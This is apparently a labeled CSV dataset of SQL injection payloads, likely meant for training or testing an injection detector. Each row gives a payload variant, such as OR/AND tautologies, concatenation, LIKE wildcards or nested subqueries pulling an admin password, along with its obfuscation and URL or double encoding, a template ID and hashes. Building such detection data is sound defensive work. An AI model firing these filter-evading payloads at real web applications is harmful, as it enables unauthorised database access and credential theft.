name%3Dtest%27+AND+%27a%27%3D%27a%23,1,sqli_string,case_var|comment_hash|ws_space,url_encoded,SQLI_STRING_001,bb6f13b09865b0b50b345ff866c43430,ed1bbcac42567128a87e385829eb4efa,36
name%3Dtest%27+||+'a--,1,sqli_string,comment_dash_dash,partially_encoded,SQLI_STRING_004,cad77f510d6ee4ef2521d1dde67ce0d7,353b364aac62226a654b5e52f4b8dac3,22
name=test' || %27a%3B-- -,1,sqli_string,comment_semicolon_comment,partially_encoded,SQLI_STRING_004,63406e295a6d1745300d1ffba83cb393,3d95e67f6d3460f1d1f26adeddcebaed,25
name=test' || 'a,1,sqli_string,standard,raw,SQLI_STRING_004,47aeed484f2a5711c1d7629024f70c73,53df3b9e402b8bcacdf9e52fd354b90b,16
name%3Dtest%27%2BLIKE%2B%27%25--,1,sqli_string,comment_dash_dash|ws_plus,url_encoded,SQLI_STRING_003,11f9a9ec131c11f7b7f7b9f8206f1e9f,09b773e3ed42a8c87f5f0492b5907841,32
name%3Dtest' LIKE %27%,1,sqli_string,standard,partially_encoded,SQLI_STRING_003,eb76d42ec7bb2e42323710fb0d7687ce,0dc31a9377905ad81926e1257613951f,22
name%3Dtest%27+LIKE+%27%25,1,sqli_string,case_var,url_encoded,SQLI_STRING_003,4fa387ea74f8e2d893f381b7232ea51c,f420459566cd00fc96c7d74694cee66e,26
name%253Dtest%2527%2509%257C%257C%2509%2527a%2523,1,sqli_string,comment_hash|ws_tab,double_encoded,SQLI_STRING_004,92eca7b5f6deb95f4a665efd8dcd411d,7632ec4db872cba44585df3758505d10,49
name=test%27/%2A*%2F+/%2A%2A/%27a,1,sqli_string,case_var|ws_comment_ws,partially_encoded,SQLI_STRING_005,7b40e4d7707e6751bc16ad50682d3e03,ed50fd29f3adf6a29e2f67293966a4e8,33
name%3Dtest%27%2520OR%2520%27a%27%3D%27a--%2520-,1,sqli_string,case_var|comment_dash_dash_space|ws_url_space,url_encoded,SQLI_STRING_002,98133380ce17f2e2f1b9d91d46a7f217,0dd442d37ad1450f3f13c8863244f7ed,48
name%3Dtest' ++%27a,1,sqli_string,standard,partially_encoded,SQLI_STRING_005,bfb4dce3f084ef4b57005b5c6fd45ee4,7a68b53289a46602c17319d418eb57a2,19
name%253Dtest%2527%252520OR%252520%2527a%2527%253D%2527a%252F%252A,1,sqli_string,comment_block_comment|ws_url_space,double_encoded,SQLI_STRING_002,efde0c99e5a765c28ae13feab89fca73,91adc96ec04972508253c1163d0d92d9,66
name=test'/**/AND/**/'a'='a#,1,sqli_string,comment_hash|ws_comment_ws,raw,SQLI_STRING_001,e0bee92a81212f686714b469ab82fd54,b8d3a640fb2a17b11a9437ffe3658f06,28
name%3Dtest%27%2520%7C%7C%2520%27a%23,1,sqli_string,case_var|comment_hash|ws_url_space,url_encoded,SQLI_STRING_004,c53c911876606e36a3fe87493984b603,f41ab47322cb0d05dd24a7c822001ab2,37
name%3Dtest%27+%7C%7C+%27a--+-,1,sqli_string,comment_dash_dash_space,url_encoded,SQLI_STRING_004,6f130538ba3e2c2c990cfce33300cae0,4fe40f196eb61d7f4f5d35ab439117c0,30
name%253Dtest%2527%2BAND%2B%2527a%2527%253D%2527a,1,sqli_string,standard,double_encoded,SQLI_STRING_001,ed63661e1934edf8e1f61968b1779ced,8a1eb801b85b1f7327efc8c96c4c7605,49
name%3Dtest%27 OR+'a%27%3D%27a%2F%2A,1,sqli_string,comment_block_comment,partially_encoded,SQLI_STRING_002,f5733c5ce76affec388321026ac8b17c,32488b534ba40ad47f0f31ee7cf9da40,36
name=test' + 'a,1,sqli_string,standard,raw,SQLI_STRING_005,0f625e9ed68b2bfd8d2815e2abcfb5ee,2daacff6ae03a27aebfbe73e16575b50,15
name%253Dtest%2527%2B%252B%2B%2527a%252523,1,sqli_string,case_var|comment_url_hash,double_encoded,SQLI_STRING_005,aa83c206e9ead74100bca0c1e4a429d7,b9694f9b92f1acb40756a38b8d74c4d4,42
name%3Dtest'	OR	'a%27%3D%27a--,1,sqli_string,comment_dash_dash|ws_tab,partially_encoded,SQLI_STRING_002,efca8139d03e137e7f033c4eb09e019f,89d459f56a5d084ecd797af49eba24c0,30
name%3Dtest%27+OR+%27a%27%3D%27a%2523,1,sqli_string,case_var|comment_url_hash,url_encoded,SQLI_STRING_002,8491c7ce3e8dab63e6f4022d77894280,dea5d9a2f312cbe73f4d6cb214b0c727,37
name%253Dtest%2527%2BLIKE%2B%2527%2525%2523,1,sqli_string,case_var|comment_hash,double_encoded,SQLI_STRING_003,dc93195d23ebcef3e2bab7ad4d47db5b,8e6e31aac144b1748cba2405c242c358,43
name%3Dtest'+LIKE+%27%,1,sqli_string,case_var|ws_plus,partially_encoded,SQLI_STRING_003,d0c45da6803de81e87cade6e2e04f5d0,4110332fa84a89cf49661cb4278e64d1,22
name=test'+++'a;--+-,1,sqli_string,case_var|comment_semicolon_comment|ws_plus,raw,SQLI_STRING_005,cbe9e776060df777a238a84b3656837d,cbe9e776060df777a238a84b3656837d,20
name%3Dtest%27%2BLIKE%2B%27%25,1,sqli_string,ws_plus,url_encoded,SQLI_STRING_003,2d6192f5453cbec2b934b1c627f74cd2,d127c1d5b1d3b7aa847d0b5ca47c96ae,30
name%3Dtest%27%20+%20%27a--%20-,1,sqli_string,comment_dash_dash_space|ws_mixed_ws,partially_encoded,SQLI_STRING_005,273fbd9d787c2b9fe89944060932518a,efe4961fa5072af17e43d44b213ed03d,31
search%3Dapple%27%2F%2A%2A%2FOr%2F%2A%2A%2F%271%27%3D%271%23,1,sqli_string,case_var|comment_hash|ws_comment_ws,url_encoded,SQLI_STRING_006,1450f98c27d36e274840493d2be31bf0,74730729f19fd17d1477ea35ff50ef97,60
name=test' LIKE '%#,1,sqli_string,comment_hash,raw,SQLI_STRING_003,8a7caefad3d78a833e8f423c7e2ec10a,bc42115e7b5c45ee34f32ddc39d42a0c,19
name%253Dtest%2527%2509AND%2509%2527a%2527%253D%2527a--,1,sqli_string,case_var|comment_dash_dash|ws_tab,double_encoded,SQLI_STRING_001,4f151c47f769687ac89d22b7ac21e324,43a776902c2f454c85da036256a91b50,55
search%3Dapple'+OR+'1%27=%271,1,sqli_string,case_var|ws_plus,partially_encoded,SQLI_STRING_006,9ec11b17743d6927082835a458cef7c9,0a1ba1d022c1762edee56a5faf5f23b7,29
search%3Dapple'+Or '1'=%271%2F%2A,1,sqli_string,case_var|comment_block_comment,partially_encoded,SQLI_STRING_006,dd28476853bf15bc674703500ab2a691,1f1dafcf5457f50271da31e353f3d1e3,33
name%3Dtest%27+||+%27a,1,sqli_string,case_var|ws_plus,partially_encoded,SQLI_STRING_004,9aa4e824e5c7da095e5b404ccc2e469f,966b7fda7e927c0b79d9c9eee0296610,22
search%253Dapple%2527%2BOr%2B%25271%2527%253D%25271%252523,1,sqli_string,case_var|comment_url_hash,double_encoded,SQLI_STRING_006,86169cdf2400a79b005d4da0e0222188,7789f109a6bbce713f16b2d6e572b2b8,58
name%3Dtest%27+anD+%27a%27%3D%27a%3B--+-,1,sqli_string,case_var|comment_semicolon_comment,url_encoded,SQLI_STRING_001,0fd9986faa82a1ca385f0e7e16a43132,23d6867529b72d52437f543ae102c1ea,40
search%253Dapple%2527%2BOR%2B%25271%2527%253D%25271,1,sqli_string,standard,double_encoded,SQLI_STRING_006,24cdaaa3c3190fba5bde7206280a2ba2,8c1083ef558e6357c4c5d726832b7166,51
search%3Dapple%27%2520OR%2520%271%27%3D%271,1,sqli_string,ws_url_space,url_encoded,SQLI_STRING_006,bfeabae204030710a6f291df22d54fd2,90b16e9ae10e5a28cf755bb57424be21,43
name%253Dtest%2527%2B%2B%2B%257C%257C%2B%2B%2B%2527a--%2B%2B%2B-,1,sqli_string,case_var|comment_dash_dash_space|ws_mixed_ws,double_encoded,SQLI_STRING_004,b05438311fe50a10dee673d03917de3e,b93650a725b0a6eb69c5f4acf9caa8f1,64
name=test' LIKE '%-- -,1,sqli_string,comment_dash_dash_space,raw,SQLI_STRING_003,9572038a74d6fba53f264db68e35fbd0,286eaadec8bfdfb5b37fbb29fff415b9,22
name%253Dtest%2527%252F%252A%252A%252FLIKE%252F%252A%252A%252F%2527%2525--,1,sqli_string,comment_dash_dash|ws_comment_ws,double_encoded,SQLI_STRING_003,d6c100b3e7dc829a2ba3f63d098205ff,aff131eaaaee2c8002930409ea6e3a7a,74
name%3Dtest%27%2F%2A%2A%2For%2F%2A%2A%2F%27a%27%3D%27a--,1,sqli_string,case_var|comment_dash_dash|ws_comment_ws,url_encoded,SQLI_STRING_002,dda8b05f3763d6048c91b8d56891a112,b63a157a29df776d09355b8eac15f0f1,56
name%3Dtest%27+%2B+%27a,1,sqli_string,case_var,url_encoded,SQLI_STRING_005,33d358b03ee9c222d545610873da5ba3,7cb068f2e7880edb33236537e52ad612,23
search%253Dapple%2527%252BOr%252B%25271%2527%253D%25271--%252B-,1,sqli_string,case_var|comment_dash_dash_space|ws_plus,double_encoded,SQLI_STRING_006,e2479e3f8d901dc26c9d25461a5ee670,e466577257fc5d506b098075a6033e63,63
search%3Dapple%27+Or+%271%27%3D%271%3B--+-,1,sqli_string,case_var|comment_semicolon_comment,url_encoded,SQLI_STRING_006,e8482066f031aa8001f0e7fb3c7f63ba,134db6215d46bebd41fd408b783d4678,42
name%3Dtest%27+AND+'a'=%27a%23,1,sqli_string,comment_url_hash|ws_plus,partially_encoded,SQLI_STRING_001,4266bafab4ce4ad55b7a72681f1111fc,5eb769984e63498a5b357007753e1d49,30
name%3Dtest'%2F**/and%2F%2A%2A%2F'a%27%3D%27a;--/%2A%2A%2F-,1,sqli_string,case_var|comment_semicolon_comment|ws_comment_ws,partially_encoded,SQLI_STRING_001,7d853c1f1866b3815db7a237b1d2eb64,e58aa7d6876398cf648edb9fe1abc796,59
name%3Dtest%27+%7C%7C+%27a%2523,1,sqli_string,case_var|comment_url_hash,url_encoded,SQLI_STRING_004,b60b8734a8a04935651dd88517cc1f58,20cb9190267a06a4509d2ba305d3559b,31
name%253Dtest%2527%2509LIKE%2509%2527%2525,1,sqli_string,case_var|ws_tab,double_encoded,SQLI_STRING_003,6069ca9360e81a287311ad0dc6a6c877,52e8bff5d98e7ac63f56592e54ab01c2,42
name%253Dtest%2527%2BLIKE%2B%2527%2525--,1,sqli_string,comment_dash_dash,double_encoded,SQLI_STRING_003,bd22c6101e0a905ad2a9371ed598ae18,f2eeed6b572dd7c0895f0025fd99f098,40
name%3Dtest%27 ||+%27a,1,sqli_string,standard,partially_encoded,SQLI_STRING_004,3c73592b040602c91944e5aeba83c107,284d9cf070cf1be89ec7975b85223979,22
name%3Dtest'	Or	%27a%27%3D%27a,1,sqli_string,case_var|ws_tab,partially_encoded,SQLI_STRING_002,d54f3fce1eff93c07f85c3d58bed78a1,8cb664081e009e0a278a31c68f6cf604,30
name=test%27+AND+'a%27='a,1,sqli_string,standard,partially_encoded,SQLI_STRING_001,23ef69a92fec0b294b5d47d6512903bd,492779646a31e761308a39fedada565c,25
name=test'/**/AND/**/'a'='a/*,1,sqli_string,case_var|comment_block_comment|ws_comment_ws,raw,SQLI_STRING_001,eb8bffefb40cb48225f8bc7373cf12f7,a6c30794db038fc8e8af07193915aae7,29
name%3Dtest%27+OR+%27a%27%3D%27a,1,sqli_string,standard,url_encoded,SQLI_STRING_002,b8cad0170e5a410294f324e370d16b51,49e80da73020913ff0c3fe471424e3e1,32
name%253Dtest%2527%252520%257C%257C%252520%2527a%253B--%252520-,1,sqli_string,case_var|comment_semicolon_comment|ws_url_space,double_encoded,SQLI_STRING_004,9ff33bfb285b2b5292f77ff696d3e2e5,2d793aeedf4c5ed32fa9cbcd01a7ed02,63
name=test%27++ %27a,1,sqli_string,standard,partially_encoded,SQLI_STRING_005,6a7bc6bfa66117269e99092bc61c8ca8,fec86d06e9d89c404c1469dcbcb00dfc,19
search%253Dapple%2527%252520Or%252520%25271%2527%253D%25271%253B--%252520-,1,sqli_string,case_var|comment_semicolon_comment|ws_url_space,double_encoded,SQLI_STRING_006,8f567a32b7adff750c69cc92f9be9d06,d1d73a46114e3caee2b428383a9c796f,74
search%253Dapple%2527%252520OR%252520%25271%2527%253D%25271,1,sqli_string,case_var|ws_mixed_ws,double_encoded,SQLI_STRING_006,9c46f26281de14d615df13ac30f20978,064b64c635ed7571c81ab02ab447c080,59
name=test%27 or 'a%27%3D%27a%3B--+-,1,sqli_string,case_var|comment_semicolon_comment,partially_encoded,SQLI_STRING_002,e08ddc7cdb7bec9943641287169abf63,0b093004d5f7b43a8e7dabe5aeb44954,35
name=test' ++%27a,1,sqli_string,standard,partially_encoded,SQLI_STRING_005,43725085b8645c4d207fb0d5b72cbb04,e9a42f471c83f1ae67bf42708b5ebcf3,17
name%3Dtest%27+%7C%7C+%27a,1,sqli_string,standard,url_encoded,SQLI_STRING_004,6f7dbb8f35c7765ab994664c1acc5b65,682074942dd997533f9244dfbfcf076b,26
name=test' +||++'a,1,sqli_string,case_var|ws_multi_space,partially_encoded,SQLI_STRING_004,a755c6e7d669464a4d3634223e2ff2ce,1f612d0c3a0b0eadfd2df6001d4e929c,18
name%3Dtest%27%2B%2B%2B%27a%3B--%2B-,1,sqli_string,comment_semicolon_comment|ws_plus,url_encoded,SQLI_STRING_005,2d26b5ed4b2249aae0f69546bb810b46,748384e55b57527bcff99221e9daae59,36
search%253Dapple%2527%2B%2BOr%2B%2B%25271%2527%253D%25271,1,sqli_string,case_var|ws_multi_space,double_encoded,SQLI_STRING_006,e51cdc77aba4deb720ecb933e9bc7aab,d700b9f90bc28ecf9be58747e6f1e9c1,57
name=test'+OR+'a'='a,1,sqli_string,ws_mixed_ws,raw,SQLI_STRING_002,2bc85ffb5fcbb1e81d3fa941a25bf251,78863a0b394e08118b5391d425c2e262,20
name=test'+and+'a'='a,1,sqli_string,case_var|ws_plus,raw,SQLI_STRING_001,3641374e988851e22988f579f3ea8623,3641374e988851e22988f579f3ea8623,21
name%3Dtest%27 OR+'a%27%3D%27a,1,sqli_string,standard,partially_encoded,SQLI_STRING_002,f8bed9089b9da20cfac90763dbf78d56,43752cde2ca43bcd3bf4f3b2b16e4b52,30
name=test'/**/LIKE/**/'%--,1,sqli_string,case_var|comment_dash_dash|ws_comment_ws,raw,SQLI_STRING_003,960bfbbdf3ce73c623323ab5d4d0caa2,cc9377c1c8ffce4e9b90cbbba3ce859a,26
name%3Dtest%27++ 'a--,1,sqli_string,case_var|comment_dash_dash|ws_space,partially_encoded,SQLI_STRING_005,878e159023c2031407652ba69ece1d16,381c546cc1d2433e832b30155c2d5d81,21
name=test%27+OR+'a%27%3D%27a%3B--+-,1,sqli_string,comment_semicolon_comment,partially_encoded,SQLI_STRING_002,4c3e66bb5e910f688eab3e3d82de4c61,74c21db0cbb69dcd093a30564a9432dd,35
name%253Dtest%2527%2BLIKE%2B%2527%2525,1,sqli_string,case_var,double_encoded,SQLI_STRING_003,4aeb0ad11241f25f4f43ef747911ef3f,97b55605ca13ef628a375c136e6d71ab,38
id%253D1%2527%2BAND%2B%2528%2528%2528SELECT%2Bpassword%2BFROM%2Busers%2BWHERE%2Buser%253D%2527admin%2527%2529%253D%2527a%2527%2529%2529,1,sqli_nested,standard,double_encoded,SQLI_NESTED_005,957847e08efc8c2de3bc6ef958dc47fc,ca930bbae607a131b19826af51a3cf7f,135
id=1'/**/anD/**/(((SELECT/**/password/**/FROM/**/users/**/WherE/**/user='admin')='a')),1,sqli_nested,case_var|ws_comment_ws,raw,SQLI_NESTED_005,fdbc33899c4521226f1b57d5556acd27,0bee633bd18ffb1b85859c8682b8f40a,86
id=1'  OR  ((('29'='29')))%23,1,sqli_nested,comment_url_hash|ws_multi_space,raw,SQLI_NESTED_004,85473d1195a4bcab284c523ec9dad9e9,02a4224f5a98c495fb0b972c21f19a1f,29
id%3D1%27%20AND%20((SELECT%201)%20=%20(SELECT%201))%20%23,1,sqli_nested,comment_hash|ws_url_space,partially_encoded,SQLI_NESTED_001,856aaae83d52781368ef8952d56149d5,78851a298c1a28158db2af84968db32e,57
id%3D1%27++AND++%28SELECT++COUNT%28%2A%29++FROM++%28SELECT++1%29t%29%3E0++%23,1,sqli_nested,comment_hash|ws_multi_space,url_encoded,SQLI_NESTED_003,b6e514e3ff31605a7faf4be4efd08ab6,d5e6f95e4fbd67bcd15747c07351be34,77
id%3D1%27%2F%2A%2A%2FAnd%2F%2A%2A%2F%28%28SELECT%2F%2A%2A%2F1%29%2F%2A%2A%2F%3D%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%2F%2A,1,sqli_nested,case_var|comment_block_comment|ws_comment_ws,url_encoded,SQLI_NESTED_001,4fd152e5802e46377aa9017b470f5f1f,a084ab3249349ca92407ff7cbe515bf4,137
id%3D1%27%2F%2A%2A%2Fand%2F%2A%2A%2F%28%28SELECT%2F%2A%2A%2F1%29%2F%2A%2A%2F%3D%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F1%29%29%2F%2A%2A%2F--,1,sqli_nested,case_var|comment_dash_dash|ws_comment_ws,url_encoded,SQLI_NESTED_001,0df6170a420518461366bedc1f5ce7bc,67683419ec7eb43a0d693a4ddca7c6e7,133
id=1' AND (SELECT COUNT(*) FROM (SELECT 1)t)>0 ;-- -,1,sqli_nested,comment_semicolon_comment|ws_space,raw,SQLI_NESTED_003,7d3f1d3dace7c957b3858b2f4dd1b507,bc6252f19a5c3feb40a6161b98067a7c,52
id%253D1%2527%2BAND%2B%2528SELECT%2BCOUNT%2528%252A%2529%2BFROM%2B%2528SELECT%2B1%2529t%2529%253E0%2B--,1,sqli_nested,comment_dash_dash,double_encoded,SQLI_NESTED_003,76a86be221b8f82fa71e3599400d76b2,fd6d146cfa07d86413b6f4fc3801f941,103
id%3D1'/%2A*/OR/*%2A/((('79'%3D%2779%27))),1,sqli_nested,ws_mixed_ws,partially_encoded,SQLI_NESTED_004,bc7a2808123c15582cb74b9550fe6ca9,6106cd8f4420c339f17b2e9bb645faa2,42
id%3D1%27	AND	(((SELECT	password	FROM	users	WHERE	user=%27admin')=%27a')),1,sqli_nested,ws_tab,partially_encoded,SQLI_NESTED_005,c4c9473f69c610fd3f1c616cd6692395,a3402df4c22b5b6ffcadef8cfbb62c3e,73
id%253D1%2527%252F%252A%252A%252FAnd%252F%252A%252A%252F%2528%2528SELECT%252F%252A%252A%252F1%2529%252F%252A%252A%252F%253D%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252F1%2529%2529%252F%252A%252A%252F%2523,1,sqli_nested,case_var|comment_hash|ws_comment_ws,double_encoded,SQLI_NESTED_001,04d8d10494b4f9e0628653bc3cc2cde8,067e7334b3fe04069f4e8dd906f237cd,210
id=1%27+AND ((SELECT 1)+%3D (SELECT 1)) %3B-- -,1,sqli_nested,case_var|comment_semicolon_comment,partially_encoded,SQLI_NESTED_001,9555fe685b0bfa28f65a56096603f9d6,5bbd7a90fdf69a71c7b426397b4f923a,47
id=1'+oR+((('86'='86')))%23,1,sqli_nested,case_var|comment_url_hash|ws_plus,raw,SQLI_NESTED_004,694db472938061e979d764a25fb53ef8,0f5b96af93d5c5e706d6fff79845967a,27
id%3D1%27%09OR%09%28%28%281%3D1%29%29%29%09--,1,sqli_nested,comment_dash_dash|ws_tab,url_encoded,SQLI_NESTED_002,efa85894f7b310d604b8ea9a1ee7194a,6c3d7eb9fce76235b35f134e9caf38ef,45
id%253D1%2527%2BOR%2B%2528%2528%2528%252766%2527%253D%252766%2527%2529%2529%2529%253B--%2B-,1,sqli_nested,case_var|comment_semicolon_comment,double_encoded,SQLI_NESTED_004,4ac9728323ef40c02bba977d5abbb824,c39b38578c515dc946d682f6f66d3c37,91
id%3D1%27 OR+((('6%27%3D%276'))),1,sqli_nested,standard,partially_encoded,SQLI_NESTED_004,b6f8ed7edf8ef7e686575b733b9e0e31,9c39234742f0a4d8101b46cbbccc0964,32
id=1' or ((('13'='13'))),1,sqli_nested,case_var|ws_space,raw,SQLI_NESTED_004,56f3f6ec4f624e20b4fc7e09158c5826,d03eca0e262e20c3d76c67a3905199f2,24
id%253D1%2527%2BAND%2B%2528SELECT%2BCOUNT%2528%252A%2529%2BFROM%2B%2528SELECT%2B1%2529t%2529%253E0%2B%252F%252A,1,sqli_nested,comment_block_comment,double_encoded,SQLI_NESTED_003,910016f2ed9e17e784bff6c401a186b5,1a9943772b7c86cd2947eea563d4ed60,111
id%253D1%2527%2B%2BAnd%2B%2B%2528%2528SELECT%2B%2B1%2529%2B%2B%253D%2B%2B%2528SELECT%2B%2B1%2529%2529%2B%2B--,1,sqli_nested,case_var|comment_dash_dash|ws_multi_space,double_encoded,SQLI_NESTED_001,4286d22c57385420c25cc7951904d012,65d67d42df19f12fac69bc315804a5dd,109
id%253D1%2527%2B%2BAND%2B%2B%2528%2528SELECT%2B%2B1%2529%2B%2B%253D%2B%2B%2528SELECT%2B%2B1%2529%2529%2B%2B%252F%252A,1,sqli_nested,comment_block_comment|ws_multi_space,double_encoded,SQLI_NESTED_001,d74443052043fb9d735caea7d8cfa1fb,18c23ea828aabe0a44743c105ef8a99b,117
id=1'/**/AND/**/(((SELECT/**/password/**/FROM/**/users/**/WHERE/**/user='admin')='a'))--,1,sqli_nested,comment_dash_dash|ws_comment_ws,raw,SQLI_NESTED_005,dc25719b2b035dedd1eb5bc9da8962d8,16ad175d05d01bf7c9f18d4ada603680,88
id%3D1%27+OR+%28%28%281%3D1%29%29%29+%2523,1,sqli_nested,comment_url_hash,url_encoded,SQLI_NESTED_002,eda39748934c4efe9ba90a78573b395a,583346ab33fa3527a3cf2ece4fc23d73,42
id%3D1%27%2520aNd%2520%28%28SELECT%25201%29%2520%3D%2520%28SELECT%25201%29%29%2520%23,1,sqli_nested,case_var|comment_hash|ws_mixed_ws,url_encoded,SQLI_NESTED_001,ffe2d94327138814a1c15a64ed53052a,e8adda063c101e53e824b308efad8371,85
id%3D1%27+AND+((SELECT+1)+%3D+(SELECT+1))+%3B--+-,1,sqli_nested,comment_semicolon_comment|ws_plus,partially_encoded,SQLI_NESTED_001,8bcea3e45658523a1e2126b063a01618,d6b58d3eda9ada4a3c76a5b77d4075ad,49
id%3D1%27+OR+%28%28%28%273%27%3D%273%27%29%29%29,1,sqli_nested,standard,url_encoded,SQLI_NESTED_004,d569c49db48367d21b77b2b2c8566d1b,2f2ecdd06aff41a1d003fc384fb31819,48
id=1'/**/OR/**/((('6'='6'))),1,sqli_nested,ws_comment_ws,raw,SQLI_NESTED_004,4c2d7a4546638802776b593c4c806c59,6726ab4be4539921c1ffc373720f2411,28
id%253D1%2527%252BOR%252B%2528%2528%25281%253D1%2529%2529%2529%252B%252F%252A,1,sqli_nested,case_var|comment_block_comment|ws_plus,double_encoded,SQLI_NESTED_002,bf6e2d38b39f20267a89864d9572eee3,ed6859f21d154f1fe48d44cd98aa5a24,77
id%3D1%27+And+(SELECT COUNT(%2A)+From (SELECT 1)t)%3E0+/%2A,1,sqli_nested,case_var|comment_block_comment,partially_encoded,SQLI_NESTED_003,0852fc137563ba19678211c077802ade,1557db047ad89aaa59c03c4c0914ec15,59
id%3D1%27+OR+((('58%27%3D'58%27)))%23,1,sqli_nested,case_var|comment_url_hash|ws_plus,partially_encoded,SQLI_NESTED_004,5eebeaaf56d8f924390c2808732da3e5,ca41bf482b30c4672f245d50f5623857,37
id%3D1%27+Or+%28%28%281%3D1%29%29%29+%23,1,sqli_nested,case_var|comment_hash,url_encoded,SQLI_NESTED_002,5e01ced8142622d8c3385f8e6bfcfb8d,7ab1a92cfd31bc99e4395cab7f96df5f,40
id%253D1%2527%252F%252A%252A%252FAND%252F%252A%252A%252F%2528%2528%2528SELECT%252F%252A%252A%252Fpassword%252F%252A%252A%252Ffrom%252F%252A%252A%252Fusers%252F%252A%252A%252Fwhere%252F%252A%252A%252Fuser%253D%2527admin%2527%2529%253D%2527a%2527%2529%2529,1,sqli_nested,case_var|ws_mixed_ws,double_encoded,SQLI_NESTED_005,17851e1e6c0f8e69e23cd1a0fe5b9b10,29a6d4f4de68a9797b72385c8326cb3e,254
id%3D1%27%2520And%2520%28%28%28SELECT%2520password%2520from%2520users%2520where%2520user%3D%27admin%27%29%3D%27a%27%29%29,1,sqli_nested,case_var|ws_url_space,url_encoded,SQLI_NESTED_005,f5e9aeb1fa8c71e2343872fd373d07ab,9786bc3ea40c29181b5415222e225cca,121
id=1'%20AND%20(SELECT%20COUNT(*)%20FROM%20(SELECT%201)t)>0%20%23,1,sqli_nested,comment_url_hash|ws_url_space,raw,SQLI_NESTED_003,5cb81841bfb19c91434f7cfa1dbaa1ef,0a77105606a2f38702f7c660792c332d,64
id%253D1%2527%2509or%2509%2528%2528%25281%253D1%2529%2529%2529%2509%252F%252A,1,sqli_nested,case_var|comment_block_comment|ws_tab,double_encoded,SQLI_NESTED_002,cd24881abb29a25278b375caddc8b3fe,eea3e91be16f78634990787bdc7a051e,77
id%253D1%2527%252Band%252B%2528%2528%2528SELECT%252Bpassword%252BFROM%252Busers%252BWHERE%252Buser%253D%2527admin%2527%2529%253D%2527a%2527%2529%2529,1,sqli_nested,case_var|ws_plus,double_encoded,SQLI_NESTED_005,0b318e5c1ba5b8ebc633ee24155d693c,2d3cc8f080772d7a623cecf5ebb28a15,149
id=1'+OR+(((1%3D1))) %23,1,sqli_nested,comment_url_hash|ws_space,partially_encoded,SQLI_NESTED_002,b6664acc2b98584c6c2c86a72cb9f90d,abc886f2bd1a3eca0cedbf0a449bf53d,24
id=1'%20OR%20(((1%3D1)))%20--%20-,1,sqli_nested,comment_dash_dash_space|ws_mixed_ws,partially_encoded,SQLI_NESTED_002,9348ef9d75bfe2502b594b569c1d2b81,a693896c9a73501dc51c4dd6ab076ed3,33
id%253D1%2527%2BOR%2B%2528%2528%25281%253D1%2529%2529%2529%2B%252F%252A,1,sqli_nested,comment_block_comment,double_encoded,SQLI_NESTED_002,f30d82ace0a3dc186b58d339ca35b5a7,9fb5d4d04851b70f424ed5a8eb5fa9c2,71
id%3D1%27+++OR+++%28%28%28%2767%27%3D%2767%27%29%29%29--+++-,1,sqli_nested,case_var|comment_dash_dash_space|ws_mixed_ws,url_encoded,SQLI_NESTED_004,fe901c451c235737a0659a57207e4e2d,420aaf85b8035549a55965d27c367826,60
id%253D1%2527%2BOR%2B%2528%2528%25281%253D1%2529%2529%2529%2B%2523,1,sqli_nested,comment_hash,double_encoded,SQLI_NESTED_002,4d9e8bbb02fbdc097de8b13cc0619975,e14df132097d812359a2f8fb407c5eb2,66
id=1%27+or (((1%3D1))) --+-,1,sqli_nested,case_var|comment_dash_dash_space,partially_encoded,SQLI_NESTED_002,f745c3d441a0c8265c117510d174e109,18b38ddf067c0c95d9b9c7ff783e44e4,27
id%253D1%2527%2BAnd%2B%2528%2528SELECT%2B1%2529%2B%253D%2B%2528SELECT%2B1%2529%2529%2B%2523,1,sqli_nested,case_var|comment_hash,double_encoded,SQLI_NESTED_001,7f52df95b22a4be593017fd0f88e5712,9de5f2fc47d41a75dafc58928ff13cb5,91
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F%28%28%28%279%27%3D%279%27%29%29%29%3B--%2F%2A%2A%2F-,1,sqli_nested,case_var|comment_semicolon_comment|ws_comment_ws,url_encoded,SQLI_NESTED_004,0d8a1c6eaa01f208038300f9d5df34c3,8b14fa774c084dae518985aa3c8f0831,88
id=1'+OR+((('83'='83')))#,1,sqli_nested,comment_hash|ws_plus,raw,SQLI_NESTED_004,5c99d8049d8b624e5dc52d5f7b21e381,d12bd7e26b0d6130905734804536245c,25
id=1'+AND+(((SELECT+password+FROM+users+WHERE+user='admin')='a')),1,sqli_nested,ws_mixed_ws,raw,SQLI_NESTED_005,66a1fbafb90367860ffe2ea70bad9248,13c0d5f854771d1381565c991577b3c2,65
id%253D1%2527%2BAND%2B%2528%2528SELECT%2B1%2529%2B%253D%2B%2528SELECT%2B1%2529%2529%2B--,1,sqli_nested,comment_dash_dash,double_encoded,SQLI_NESTED_001,6216d6e36af9906c396294f45b5ceb3e,331d03548a4f65cef3dbab19f8b57708,88
id%3D1%27++AND++%28%28SELECT++1%29++%3D++%28SELECT++1%29%29++%2523,1,sqli_nested,case_var|comment_url_hash|ws_multi_space,url_encoded,SQLI_NESTED_001,691b25778b220937b6a76fdb1c6a20fc,5faf9ca0d9e3c51e744da39081009296,66
id=1'  AND  ((SELECT  1)  =  (SELECT  1))  --  -,1,sqli_nested,comment_dash_dash_space|ws_multi_space,raw,SQLI_NESTED_001,6f8efcb2b72535ef6e18b53062acd8ac,fd1ec77988803e14d2161fffaee54b6f,48
id=1'	AND	(((SELECT	password	From	users	Where	user='admin')='a'))--,1,sqli_nested,case_var|comment_dash_dash|ws_tab,raw,SQLI_NESTED_005,94075423c758e0e5f320daf0bef52b9a,4cf5c6f29a6498411dbedfa0fa7c7c32,67
id%3D1' OR+(((1=1))) -- -,1,sqli_nested,comment_dash_dash_space|ws_space,partially_encoded,SQLI_NESTED_002,3aa384f967e3be2ed6f4e382c72b83a2,2b400a43984956e39d5035123b529b60,25
id=1' Or (((1=1))) #,1,sqli_nested,case_var|comment_hash|ws_space,raw,SQLI_NESTED_002,ee36b66a7e8296f2cbb1f8620550543d,c40acd634981a6ca20b9697076e68358,20
id=1%27+And (SELECT+COUNT(*)+FROM+(SELECT 1)t)%3E0+%23,1,sqli_nested,case_var|comment_url_hash,partially_encoded,SQLI_NESTED_003,25c39596126e0d160a69f1aeb84e834f,67974a922fdb15ba2d906d4a61200b55,54
id%253D1%2527%2BOr%2B%2528%2528%2528%252745%2527%253D%252745%2527%2529%2529%2529,1,sqli_nested,case_var|ws_space,double_encoded,SQLI_NESTED_004,590e2ba90716076d7d154f13a2a25500,813deb634413bc5f8d807577c23ed37f,80
